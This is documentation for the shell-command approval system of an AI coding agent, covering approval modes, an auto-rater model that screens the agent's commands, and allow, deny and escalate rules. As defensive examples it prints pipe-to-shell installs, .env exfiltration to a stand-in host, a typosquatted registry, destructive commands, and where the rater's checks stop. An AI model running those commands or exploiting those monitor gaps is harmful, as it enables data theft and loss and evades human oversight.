# Shell tool & approvals

In `gth code`, the agent can run shell commands so it can test its own work — run your suite, check
`git status`, install a package — instead of only reading and writing files. **Approvals** decide
which of those commands run on their own and which stop to ask you — and, at the strictest modes,
which file edits and tool calls do too. There is one setting, and it is a ladder of five modes.

## The main use case: let the agent run your tests, on your terms

Goal: while you work in `gth code`, the agent runs your test suite as it goes, and you decide which
of its other commands are allowed to run.

The general-purpose shell tool (`run_shell_command`) is **on by default in `code` mode**, so you
already have it — just start a session:

```bash
gth code "add a retry to fetchOrders and make the tests pass"
```

Every session starts at **`assisted`**, the default mode: the auto-rater rates each command before
it runs. A command it rates safe (running your tests, `git status`) executes with no prompt.
Anything else stops and asks you, on the full-screen interface `gth code` starts in by default:

```
The agent wants to run a shell command via run_shell_command
  1 │ rm -rf node_modules
⚠ Auto-rater (destructive): this can destroy work or data, but undoing it is possible from inside this session.
    the rater's own words:
  1 │ deletes a directory tree without confirmation
[s]/[a] will remember:
  1 │ rm -rf node_modules
    stored as:
  1 │ { "type": "shell", "matcher": "exact", "pattern": "rm -rf node_modules" }
[d] will refuse, for the rest of this session:
  1 │ rm -rf node_modules
    recorded as:
  1 │ { "type": "shell", "matcher": "exact", "pattern": "rm -rf node_modules" }
Approve?  [o]nce   [s]ession   [a]lways   [N]o   [d]eny always
```

The plain surface (`--no-tui`) asks the same question and takes the same answers; it spaces the menu
differently, as `Approve? [o]nce / [s]ession / [a]lways / [N]o / [d]eny always:`.

The command and the rater's explanation are written by a model, so they are shown inside a numbered
frame: a line of either one can never sit flush-left where the prompt's own lines are, and a
command that spans twenty lines is shown whole rather than cut down to its first.

- **once** — run this one command, then keep asking.
- **session** — run it and stop asking about **that exact command** for the rest of this session.
  It is remembered as the entry shown on the prompt, so a longer command that merely starts with it
  (`rm -rf node_modules dist`) asks again. To trust a whole family of commands at once, write a
  pattern in `approvals.allow` yourself (below) — breadth is always something you choose in a file
  you can read, never something inferred from one answer to one prompt.
- **always** — same as session, but also remembered across future sessions (persisted to
  `.gsloth/.gsloth-settings/shell-allowlist.json`).
- **No** (the default — just press Enter, or any key that is not one of these) — reject it. The
  agent is told what it can do next: run the same command with a justification, run a different one,
  or ask you — so it changes course instead of retrying the same thing or giving up.
- **deny always** — reject it *and stop being asked*: the entry shown under `[d]` joins your deny
  list for the rest of the session, so the same call is refused outright the next time the agent
  tries it. It is not written to any file — a new session starts asking again. Shown whenever an
  entry can be formed, which is more often than **session**/**always** are offered: a command the
  gate cannot read (`ls && rm -rf build`) can be refused permanently even though it can never be
  approved permanently, and so can a **catastrophic** one. To refuse something for good, put it in
  `approvals.deny` (below).

### Where the prompt is written

This depends on which surface you are in, and it matters only when you are capturing a session to a
file.

**On the plain surface (`--no-tui`)** every line of the prompt goes to **stderr**, including the
`Approve?` menu — a prompt is not program output, and one written across both streams cannot
promise the order its lines arrive in once they are going to different places.

Two consequences to know about:

- Piping stdout captures the session but **not** the prompt, so `gth code --no-tui | tee session.log`
  leaves the log without the command you were asked about or the rating on it. To keep both in one
  file, redirect stderr as well:

  ```bash
  gth code --no-tui 2>&1 | tee session.log
  ```

- Discarding stderr (`2>/dev/null`) hides the prompt while the session still waits for your answer,
  so the run looks hung when it is simply asking you something you cannot see. Redirect it to a file
  rather than throwing it away.

**On the default full-screen interface** the whole session, prompt included, is painted to stdout,
so `2>` collects nothing of it. That interface repaints rather than scrolling, and is not what you
want to capture to a file — use `--no-tui` when you need a log.

### What the rater can say

The word in brackets after `Auto-rater` is one of four outcomes:

The prompt says which one it is, in words as well as colour, because a terminal without colour is a
terminal you still have to decide in.

- **safe** — runs with no prompt.
- **destructive** — harmful, but you could undo it from inside the session: `rm -rf node_modules`,
  `git reset --hard`. Asks you, with every choice above; at Auto the agent gets a few rounds to
  narrow or justify it first, and you are asked when those run out — and you are shown that whole
  argument, round by round, when you are. The exception is a command one of the checks below
  decides on its own — naming a host, or expanding an environment variable into a script — which
  comes straight to you with no rounds at all, because no answer the agent could give would
  change it.
- **catastrophic** — cannot be undone from inside the session: `mkfs`, `DROP DATABASE`,
  `terraform destroy -auto-approve`, `kubectl delete namespace production`. Shown in red, saying
  that undoing it would need something outside the session. It asks you *every* time: **session**
  and **always** are not offered at all for this outcome, so approving one `terraform destroy`
  never approves the next one. **deny always** is still offered — refusing more is never the thing
  that needs withdrawing — so the menu reduces to `[o]nce`, `[N]o` and `[d]eny always`.
- **attack** — the command's own structure shows something hostile: it goes after a credential for
  its own sake, escalates privilege, installs persistence, impersonates a hostname, or hides what it
  really runs. This one **ends the run** instead of asking. In an interactive session you first get
  a red banner (below); where there is nobody to ask — CI, a one-shot `gth exec`, a server — the run
  simply ends. If the command is legitimate and you need it regularly, put it in `approvals.allow`
  (below) — that list is checked before the rater.

#### The red banner: getting past an `attack` verdict

Interactively, an `attack` verdict stops on a red banner rather than ending the session outright.
It shows the command and the rater's reason — both framed, like every other untrusted string here —
says that the consequences may be irreversible, and offers exactly one way through: **type
`run anyway` and press Enter**.

It is not the approval dialog and it does not behave like one. There is no key, no menu and no
scope. Anything else stops the run — any other text, Enter on its own, a near miss like `run` or
`run anyway please` — and it stops on the first answer rather than asking again. In the TUI you can
stop with text already typed too, and the two ways out cost different things: `q` or `Esc` return
you to the session, while `Ctrl+C` stops by exiting `gth`.

`run anyway` runs **that one command and nothing else**. Your approvals mode does not change,
nothing is written to the allow-list, and the next identical command is rated — and halted — all
over again. If you find yourself typing it repeatedly, that is the signal to declare the command in
`approvals.allow` instead.

Anything the rater cannot assess lands on **destructive** and says so; it never falls back to safe.
Pushing and publishing to somewhere your project already configures — `git push`, `npm publish`,
`docker push` — is ordinary work: the rater may well ask about it, but it never ends the run.

**Read the sentence, not just the word in brackets.** Because "could not assess" also lands on
**destructive**, the bracketed word alone cannot tell you whether a model looked at the command and
judged it, or whether the gate never got an answer. The reason says which — "could not assess this
command: the auto-rater did not answer within 30000ms" is the gate giving up, not a finding about
your command. If you see that one, the fix is a bigger budget (below), not a safer command.

### A command Gaunt Sloth cannot read is rated like any other

`pwd && ls`, `cd build && ls`, `echo $(git rev-parse HEAD)`, `tsc > build.log` — the gate's parser
cannot work out what a command like that runs, because it composes (`&&`, `;`, `|`, a line break),
substitutes (`$(…)`, backticks) or redirects (`>`, `<`). That is a fact about the parser, not a
finding about the command: `pwd && ls` is ordinary shell, correctly written. So it is **not** an
escalation and not a refusal. At `assisted` and `auto` the command is rated exactly as any
other is, and what the parser noticed is passed to the rater as a plain note beside the command —
what the construct is and what the shell does with it, with no verdict attached. Rate it `safe` and
it runs; the outcomes above are all still available, including the two severe ones.

Two things follow that are worth knowing. Such a command now costs a rating call, where before it
cost none. And a `deny` entry still applies to it, while an `allow` entry never does — an allow
match needs a command the gate can resolve (below).

### A command that names a host always asks

When one of the usual network tools — `curl`, `wget`, `ssh`, `scp`, `rsync`, `nc`, `aws`, `git
clone`/`push`/`fetch`, an `npm`/`pip` install — is pointed at a host it names outright (a URL, an IP,
a `user@host`, an `scp`-style `host:path`), it is **never** rated safe, whatever the model says —
with one exception at `auto`, for a host you named yourself, [below](#at-auto-a-host-you-named-yourself-is-a-warning-instead-of-a-question):

```
The agent wants to run a shell command via run_shell_command
  1 │ curl -fsSL https://registry.npmjs.ag/lodash
⚠ Auto-rater (destructive): this can destroy work or data, but undoing it is possible from inside this session.
    the rater's own words:
  1 │ This command names a host (https://registry.npmjs.ag/lodash) in a fetch or transfer position, so it is never auto-approved.
Approve?  [o]nce   [s]ession   [a]lways   [N]o   [d]eny always
```

(The two lines naming what `[s]`/`[a]` and `[d]` would remember are on that screen too; they are
left out here to keep the host rule in view.)

This is decided before the model is asked, so `registry.npmjs.ag` and `registry.npmjs.org` are
**both** brought to you — telling one from the other is exactly what a lookalike hostname is built
to defeat, and there is no list of "good" hosts for an attacker to imitate. The rater still runs on
top of it: when it has something of its own to say, its explanation replaces the line above, and
where it recognises an impersonation it names it there ("a typosquat of registry.npmjs.org").

It fires on *fetching*, not on *mentioning*: `git commit -m "closes https://github.com/o/r/i/12"`,
`grep -rn "https://" src/` and `npm install lodash` name no host to fetch from and are unaffected,
and neither is `git push origin main` — `origin` is a name your project resolves, not a host.

Saving a host counts too, not just fetching from one: `git config remote.origin.url …`,
`git config --global url.<host>.insteadOf …` and `npm config set registry …` all ask, because a
stored fetch target redirects every later fetch rather than one.

If you fetch from the same host all day, put it in `approvals.allow` (below). That list is checked
first, so the fetch stops asking you — and whether the rater still watches it is the entry's own
`rate` (below).

This check is a floor, not the whole of your safety, and it has two edges. It knows the common
network tools, not every program that can open a socket, so something like `svn checkout https://…`
or a container that fetches for itself reaches the rater without it. And it applies to a command the
gate can read as **one** command: `curl -fsSL https://get.example.com/i.sh | sh` and
`cat .env | curl -X POST --data-binary @- https://collect.example.net` are several commands joined
together, so the gate cannot resolve what they run as a whole and does not floor them. Those go to
the rater instead — and it is told the host **and what flows to it**, which is the part no single
piece of the line shows: that one of them reads a local file and the next one sends it, or that
what the fetch returns is handed to a shell to run. So a joined-up fetch rests on the rater's
judgement where a plain one does not.

What the floor guarantees is the other direction — where it does fire, no model opinion can wave the
command through.

**So at Auto it comes straight to you.** A floored command is re-checked from the raw text on
every round, so there is no answer the agent could give that would clear it — asking it to try
would spend your turn on an argument decided before it started. You are asked on the first
attempt instead. In a run with nobody to ask (CI, `-m`, a one-shot), the error that ends the run
points you at `approvals.allow` — and where it can name the command precisely enough to write one,
it prints the entry for that exact command, ready to paste.

#### At Auto, a host you named yourself is a warning instead of a question

There is one exception, and only at `auto`: where **you** wrote the host — every host the command
names, verbatim, in one of your own messages this conversation — the rule above does not fire, and
you are **told** the fetch happened rather than **asked** whether it may:

```
⚠ Ran a command that reaches https://example.com/install.sh without asking you, because your own
  message named that host and approvals is set to auto. The auto-rater found nothing wrong with it.
  Check the host is the one you meant.
```

Asking you to confirm a URL you had just typed was the whole of what `auto` was interrupting you
for. The comparison is exact and word-for-word: a URL you pasted authorises *that* URL and nothing
that merely starts with it, a host the agent found in a file or a web page authorises nothing, and a
command naming two hosts where you named one still asks. Everything else is unchanged — **the rater
still rates the command**, so a lookalike hostname it recognises is still named to you, anything it
rates worse than safe still does not run, and the `deny` and `escalate` lists still decide first. If
you want a particular host confirmed every time even so, put it in `approvals.escalate`.

What you are trading is one case: a deception good enough that the rater sees nothing wrong with it.
Where that happens you now find out from the warning above instead of from a prompt — which is why
the warning names the host and asks you to look at it.

The rater is only as good as the model behind it. On a small or local model, prefer the `write` mode
(below) or point the rater at a stronger model with `approvals.rater`.

### Give a local rater enough time

One rating call gets **30 seconds** by default, and that is a hosted-model number. A local model is
slower, and — awkwardly — the harder the command, the longer it thinks, so a fixed budget cuts off
exactly the commands that most needed rating. Measured on a 12B over Ollama, the same set of
commands took anywhere from 6 seconds to nearly two minutes.

When the rater runs out of time the command is escalated rather than approved, which is safe but is
also the opposite of what `assisted` and `auto` are for: you end up being asked about
everything, and nothing tells you why. So gth says so, once per occurrence, and you can raise the
budget:

```json
{
  "approvals": {
    "mode": "auto",
    "rater": "local-rater",
    "raterTimeoutMs": 120000
  }
}
```

It is a number you set rather than one gth guesses from the provider, because a guess about your
hardware that turns out wrong fails quietly.

To have the agent run tests *without* a rating call, give it the fixed `run_tests` dev-command tool:
you set the exact command, so there is nothing for the model to compose and **nothing for the rater
to judge**. What it does not escape is the mode: whether a call runs on its own or comes to you is
the mode's row in [the table below](#the-ladder-approvals), for this tool as for every other. Put
this in `.gsloth.config.json` at your project root:

```json
{
  "commands": {
    "code": {
      "filesystem": "all",
      "builtInTools": {
        "gth_checklist": true,
        "gth_grep": true,
        "run_tests": { "command": "npm test" },
        "run_shell_command": { "timeout": 300000 }
      }
    }
  }
}
```

Now `run_tests` runs `npm test` on demand, while any *other* command the agent composes (a `git`
commit, `npm install`, a one-off script) is an ordinary shell command and gets whatever the mode in
force does with one — the auto-rater at `assisted` and `auto`. The `timeout` bump gives a slow
command up to 300000 ms (5 minutes) before it is killed; the default is 120000 ms.

A per-command `builtInTools` object **replaces** the default set entirely, which is why
`gth_checklist` and `gth_grep` (the two defaults) are listed explicitly — drop them and they are
gone.

## The ladder: `approvals`

There is one approvals setting, and it takes the mode name:

```json
{ "approvals": "assisted" }
```

| Mode | What it is for | Rater |
|---|---|---|
| `manual` | For a handful of commands you want to read yourself — not a mode to leave running. In this session Gaunt Sloth reads and lists files in your working folder on its own; everything else — shell, file changes, MCP and custom tools — comes to you, until you tell it to always allow a command. | no |
| `write` | Manual, for work that is mostly editing, and like Manual a bounded stretch: the built-in file tools run free inside your working folder. The shell is not confined that way, so shell commands, MCP calls and custom tools still come to you, until you tell it to always allow a command. | no |
| `assisted` | For everyday, recoverable work: safe commands run, anything riskier comes to you — usually with a line explaining what it does. Gaunt Sloth can still rewrite and delete files in your working folder without asking — "safe" means each action is checked for reaching outside that folder or harming your system, not that nothing changes. | yes |
| `auto` | For recoverable work you want to keep moving: Auto sends a risky command back to the agent to fix or justify a few times, then asks you. It is not safe — Gaunt Sloth will change and delete things, your deny list still applies, and when it does ask, you are shown the whole argument that led there. | yes |
| `bypass` | No gate, for a throwaway environment you would not mind losing. Whatever Gaunt Sloth decides to run, runs — nothing is rated and nothing is asked; only the refusals in your config’s deny list still apply. | no |

<!-- Every row above is a byte-for-byte copy of `APPROVAL_RUNG_DESCRIPTIONS` in
     `packages/core/src/config/shell-policy.ts`. A change to that constant and to the row it
     belongs to has to land in the same commit, or the guide and the picker describe a mode
     differently. -->

These are the same sentences `/approvals` shows in a session, so the guide and the picker cannot
describe a mode differently.

The choice you are really making is **`manual` → `assisted` → `auto`, plus `bypass`** — those four
are what `/approvals` offers you. `write` is not a further step along that line: it is `manual` with
edits inside your working folder granted as well as reads, so it is a variant of `manual` rather
than something between `manual` and `assisted`. Set it whenever you want it, with
`/approvals write` or in config; it simply does not take up a row in
[the picker](interactive-sessions.md#slash-commands).

`manual`, `write` and `bypass` consult no model at all, so they are reproducible and cost
nothing. `assisted` and `auto` each spend one rating call per gated command.

Choosing `bypass` is not choosing more trust in the rater: it switches the gate off. Nothing is
rated, nothing is asked, and the only check left is the `shell` entries in your deny list — a `tool`
entry is [not compared there](#which-entries-a-mode-consults) — so what runs under it is not what
some check cleared, it is whatever the agent decided to do.

What any of these modes does and does **not** protect you from, and what has to sit outside Gaunt
Sloth to cover the rest, is
[What approvals protect you from](what-approvals-protect-you-from.md).

Switch mode for the current session with `/approvals manual|write|assisted|auto|bypass`
(see [Interactive sessions](interactive-sessions.md#slash-commands)).

### Answering a prompt that is not a shell command

At `manual` and `write`, most of what stops to ask you is not a shell command — it is an MCP call, a
tool you wired in yourself, or, at `manual`, a file write. The prompt's opening line names the call:
a gated write reads *The agent wants to use the `write_file` tool*, with the arguments framed
beneath it the same way a command is.

**An MCP call also names the server it reaches**, which is usually what you need in order to answer
at all — `create_issue` against a scratch tracker and `create_issue` against the one your team runs
on are the same tool name and a different decision:

```
The agent wants to call create_issue on the MCP server jira, via mcp__jira__create_issue
  1 │ {"summary":"ship it"}
```

`jira` is your own key under `mcpServers`, so it is the name you gave that server yourself, and
`mcp__jira__create_issue` is the registered tool name the agent called. The answers are the same
ones listed [at the top of this page](#the-main-use-case-let-the-agent-run-your-tests-on-your-terms)
— and **session** / **always** remember *that tool on that server*, so approving `create_issue` on
`jira` says nothing about the same tool name on any other server.

## The agent knows which of its tools cost you a prompt

The cheapest approval is the one that never happens, so the agent is told the posture up front: at
every mode except `bypass`, the description of each tool that needs approval gains a sentence
saying so, and the tools that run freely say nothing. Which descriptions those are follows the
mode's row in the table above — at `assisted` and `auto` only the shell is gated, so only the
shell's changes; at `manual` and `write` everything the mode does not run freely carries one.
There are three wordings, not one per mode: at `manual` and `write` the sentence says the call
*will* require your approval; at `assisted`, that it *may*; at `auto`, that the auto-rater *may
refuse* it. The last one is a different claim rather than a softer one — at Auto an unsafe-looking
command comes back to the agent first, and the agent is the one who has to do something about it.
Each sentence also tells the agent to use that tool only when the result cannot be achieved with
the other tools it has.

The auto-rater backs that up at `assisted` and `auto`. When it does not rate a command safe
and one of the tools the agent already has would do the same job, it names that tool in its
explanation. At Assisted that explanation reaches you, on the rater line of the approval prompt; at
Auto a **destructive** one goes to the agent as the reason its command was refused, and reaches you
when the exchange has run out of rounds — a **catastrophic** one comes straight to you:

```
⚠ Auto-rater (destructive): rewrites a file in place; edit_file does this without a shell
```

If you then decline, the agent is told that `edit_file` needs no approval and will not interrupt
you — which is what makes it take the other route rather than re-arguing this one.

A named alternative is a suggestion, never an approval: it does not run the command, and the
suggested tool is gated on its own terms when the agent calls it. If nothing the agent already has
can do the job — a path outside your working folder, an install, a call to a service — the rater
names nothing.

## The extras: rater, allow, deny, escalate

When you need more than the mode, write the object form instead. The scalar above is exactly sugar
for `{ "mode": <value> }`:

```json
{
  "approvals": {
    "mode": "assisted",
    "rater": "safety-rater",
    "allow": [
      { "type": "shell", "matcher": "exact", "pattern": "npm test" },
      { "type": "shell", "matcher": "glob", "pattern": "git status*" }
    ],
    "deny": [
      { "type": "shell", "matcher": "exact", "pattern": "git push --force" },
      { "type": "shell", "matcher": "glob", "pattern": "npm publish*" }
    ],
    "escalate": [
      { "type": "shell", "matcher": "exact", "pattern": "terraform apply" }
    ]
  },
  "commands": {
    "pr": { "approvals": "manual" }
  }
}
```

- **`rater`** — the name of an identity profile whose model does the rating, instead of the session
  model. This is the fix for a weak main model: point it at a stronger one. A name that does not
  resolve is a config error, never a silent fallback. It is only consulted at `assisted` and
  `auto`.
- **`allow`** — what you trust. Checked **before** the rater at every mode except `bypass`, so an
  allow-listed call does not stop to ask you — the one exception is the `rate` tripwire below. This
  is the supported way to make a non-interactive pipeline pass.
- **`deny`** — what never runs. A `shell` entry is checked **before** `allow` and before the rater,
  and it is the one check `bypass` keeps: choosing `bypass` means *"stop asking me"*, not *"forget
  what I told you never to do"*. An entry naming a **tool** reaches less far — see
  [Which entries a mode consults](#which-entries-a-mode-consults).
- **`escalate`** — what always asks you, whatever the mode would have done, and with no rating call.
  It outranks `allow`, including a grant you made at a prompt, so *this specific thing asks even
  though its class would not*. It is **inert at `bypass`**: that mode means *stop asking me*, and
  the mode you chose for the session wins. A stop that must survive `bypass` is a `deny` entry
  naming the command — and, like `deny`, an `escalate` entry naming a tool only reaches as far as
  the mode gates that tool.

Where entries from more than one list match the same call, **the most restrictive one wins — deny
over escalate over allow** — so the order you write them in never matters.

All three are read-only input: Gaunt Sloth merges them with what you approve or reject at the
prompt, and never writes back to your config file.

A per-command value overrides **only the fields it names**. `"commands": { "pr": { "approvals":
"manual" } }` above says the `pr` command has no business writing files, whatever the root
setting is — and that is *all* it says: the mode changes, and `rater`, `raterTimeoutMs` and the
lists still come from the root.

**Setting a command to `auto`: the file you point it at counts as your own input.** Four commands
are fed by something other than what you type — `exec` runs a prompt file read from disk, `ask -f`
reads a file and piped stdin, and `review`/`pr` carry the whole diff. All of it reaches the agent as
*your* side of the conversation, so anything that treats your words as authority treats those bytes
the same way. The one thing that does today is the host rule below: at `auto`, a host named in that
file will let the fetch run without asking you, exactly as if you had typed the URL. That is what
`auto` on a file-fed command means — it is a deliberate setting, not a default, and the difference
from `assisted` is precisely that the file gets to speak for you.

The lists do not all merge the same way, and the difference is deliberate:

- **`deny` and `escalate` add up**, across every scope and both config layers. A command-specific
  `deny` entry joins the root's rather than standing in for it, and a global config's entries join
  your project's. So a per-command mode can never quietly drop a prohibition you wrote at the root
  — which matters most at `bypass`, where your deny list is nearly the last check left. The flip
  side: **removing an inherited `deny` or `escalate` entry for one command is not expressible.** If
  a command needs to be free of a rule, the rule does not belong at the root.
- **`allow` is replaced** when a command (or the higher config layer) states its own, and inherited
  when it does not. So you *can* narrow what a command runs unprompted — give it its own `allow`
  list, and the root's no longer applies there.

The reason they differ is what each mistake costs you. A missed `allow` entry means one extra
prompt; a missed `deny` entry only leaves the call to whatever your mode would have done with it
anyway. A **too-broad `allow` entry runs, and runs without asking you** — whether the rater still
watches it is the entry's own `rate` (below), which a `glob` or `regexp` entry leaves on. So the
restrictive lists grow across scopes, and the permissive one does not.

### Which entries a mode consults

An entry is compared against a call only where the mode in force **gates** that call. A call the
mode does not gate is approved as it arrives, before any list is read — so how far your three lists
reach is the mode's own row in [the table above](#the-ladder-approvals).

- **A `shell` entry always applies.** The shell is gated at every mode, so a `shell` entry in
  `deny`, `escalate` or `allow` is compared against every command the agent proposes — the `deny`
  list under `bypass` included.
- **A `tool` or `mcpTool` entry applies only where the mode gates that tool.** At `assisted`, `auto`
  and `bypass` the shell is the only gated tool, so an entry naming a tool is compared against
  nothing there — a `deny` entry included. At `manual` and `write` the built-in file tools the mode
  grants also run free and are never compared: `manual` grants the read tools, `write` the read and
  the write tools. So an entry naming a read tool such as `read_file` or `gth_grep` is compared at
  no mode at all.
- **`rate` on a tool entry does nothing at any mode.** The auto-rater reads shell commands only, so
  a `tool` or `mcpTool` entry never produces a rating call, whatever its `rate` says.

So a prohibition you need at `assisted`, `auto` or `bypass` has to name the **command** that would
carry it out. Where it is the tool itself you do not want run, take it away rather than deny it:
leave the server out of `mcpServers`, or the tool out of that command's `builtInTools`
([Tools configuration](../configuration/tools.md)).

`/approvals` reports the entries you declared, not the ones the mode in force can act on, so a
`Denied:` count that includes a tool entry at `assisted` is counting your config rather than checks
that can fire.

### Writing an entry

Every entry in all three lists is the same explicit object. `type`, `matcher` and `pattern` are
**always required** — nothing is inferred, so an entry can only be read one way:

| field | values |
|---|---|
| `type` | `shell` (a command) · `tool` (a built-in or custom tool) · `mcpTool` (a server's tool) |
| `matcher` | `exact` · `glob` · `regexp` · `hint` (`hint` on tool subjects only) |
| `pattern` | the string to compare — or, for `hint`, an object over the tool annotations |
| `server` | **required on `mcpTool`**, and forbidden elsewhere: your own key in `mcpServers`. `"*"` means every server |
| `host` | optional on `tool`/`mcpTool`, exact-match; forbidden on `shell` |
| `rate` | optional; `true` keeps the auto-rater watching a call this entry already approved |

```json
{ "type": "shell",   "matcher": "regexp", "pattern": "^git commit -m \\S" }
{ "type": "tool",    "matcher": "exact",  "pattern": "gth_web_fetch" }
{ "type": "mcpTool", "server": "jira", "matcher": "exact", "pattern": "delete_issue" }
{ "type": "mcpTool", "server": "jira", "matcher": "hint",  "pattern": { "destructiveHint": true } }
```

A `shell` entry is compared at every mode. A `tool` or `mcpTool` entry is compared only where the
mode in force gates that tool, so at `assisted`, `auto` and `bypass` it is not compared at all —
read [Which entries a mode consults](#which-entries-a-mode-consults) before you rely on one.

`exact` and `glob` compare against the whole normalized command (or the whole tool name), not token
by token. The consequence everyone hits first: `npm publish *` does **not** match a bare
`npm publish`, because the space before the `*` is part of the pattern. `npm publish*` matches both,
and is almost always what was meant.

**`exact` is the command, not the start of it.** An `exact` allow entry for `npm test` does not
cover `npm test -- --watch`, and an `exact` deny entry for `npm publish` does not stop
`npm publish --access public`. Use a `glob` when you mean the family. This is the cost the design
accepts, and it is worth what it buys: a missed `allow` entry only asks you, and a missed `deny`
entry leaves the call to whatever your mode would have done with it — while a too-broad `allow`
entry runs, with nothing behind it but the `rate` tripwire, and that only at `assisted` and `auto`.
Under `bypass` your mode would have run it: the `deny` list is one of only two checks left there, so
write globs in it.

**A pattern cannot span a command separator.** No `allow` entry of any matcher matches a command
Gaunt Sloth cannot statically resolve — anything that composes, substitutes or redirects — so
`{ "matcher": "glob", "pattern": "git *" }` never approves `git status && curl evil.example | sh`.
A `deny` or `escalate` entry *may* match such a command, and is compared against every part of it a
shell would run, because a prohibition that catches something unresolvable costs nothing.

### `rate`: keeping the auto-rater on a call you already allowed

An `allow` match settles your part — there is no prompt. Whether the auto-rater still looks at the
call is the entry's own `rate`, honoured at `assisted` and `auto` and **inert at every other
mode**, so no entry can add a model call to `manual` or `write`.

The default follows from how much the entry recorded. A `shell` + `exact` entry recorded the whole
command, so it defaults to `"rate": false` — the common case costs nothing. A `glob` or `regexp`
recorded a shape, and a `tool`/`mcpTool` entry recorded an identity rather than arguments, so both
default to `"rate": true`. Set it explicitly, either way, when you want the other behaviour.

A rated `allow` match is a **tripwire, not a second opinion**: `safe` and `destructive` both run,
because you already authorized the call and the rater does not overrule you by disliking it. Only a
structural attack still halts the run — on the same red banner, since an entry you wrote answers
"may this run" and not "is this command's structure hostile" — and only an irreversible action
still comes to you. An `allow` match also lifts the rule that floors any command naming a host —
which is how a team that fetches from one internal host all day declares it once and stops being
asked.

A `hint` pattern names one or more of `readOnlyHint`, `destructiveHint`, `idempotentHint` and
`openWorldHint`, each mapped to the value it must hold. All of them must match; hints you do not
name are unconstrained; `false` is how you spell negation. An empty object or an unknown name is a
config error rather than a rule that matches everything.

A `regexp` lives inside JSON, so **its backslashes are doubled** — `\\s`, never `\s`. This is worth
saying because `\s` is not a valid JSON escape: the mistake fails the whole config file to parse,
and the error points at a line number rather than at your pattern. Patterns are compiled and
length-checked when the config loads, so one that cannot compile is an error you see at startup.

## Non-interactive runs

Where there is nobody to ask — CI, a one-shot `gth exec`, a server — an escalation is not a prompt:
the run **exits non-zero**, printing the command, its rating and the reason. It never waits, and it
never times out into an approval. Declare what the pipeline is allowed to run:

```json
{
  "approvals": {
    "mode": "assisted",
    "allow": [
      { "type": "shell", "matcher": "exact", "pattern": "npm test" },
      { "type": "shell", "matcher": "exact", "pattern": "npm run build" },
      { "type": "shell", "matcher": "glob", "pattern": "git status*" }
    ]
  },
  "commands": { "exec": { "builtInTools": { "run_shell_command": { "enabled": true } } } }
}
```

## Examples

```json
// Approve everything yourself except the agent's own edits inside your working folder
{ "approvals": "write" }

// Rate with a stronger model than the session's
{ "approvals": { "mode": "assisted", "rater": "safety-rater" } }

// Rate every command, and put publishing beyond anything a rating can approve
{ "approvals": { "mode": "auto", "deny": [
  { "type": "shell", "matcher": "glob", "pattern": "npm publish*" },
  { "type": "shell", "matcher": "glob", "pattern": "git push --force*" }
] } }

// Fixed dev commands, no arbitrary shell at all
{ "commands": { "code": { "builtInTools": {
  "gth_checklist": true, "gth_grep": true,
  "run_tests":  { "command": "npm test" },
  "run_lint":   { "command": "npm run lint" },
  "run_build":  { "command": "npm run build" },
  "run_shell_command": false
} } } }

// Cap the output the shell tool feeds back to the model (default 100000 bytes)
{ "commands": { "code": { "builtInTools": {
  "run_shell_command": { "maxOutputBytes": 200000 }
} } } }
```

## Related

- Every `builtInTools` key and its defaults: [Tools configuration](../configuration/tools.md).
- The `/approvals` slash command: [Interactive sessions](interactive-sessions.md#slash-commands).
- Migrating a pre-2.0 `yolo` / `judge` config, or a CFG-26 `mode`/`strictness`/`escalate` one:
  [Migration](../MIGRATION.md#i-approvals-and-the-auto-rater-hard).
- The `code` / `exec` commands and their flags: [Commands](../COMMANDS.md#code).
- Give the agent project rules while it codes: [Code with your rules](code-with-your-rules.md).
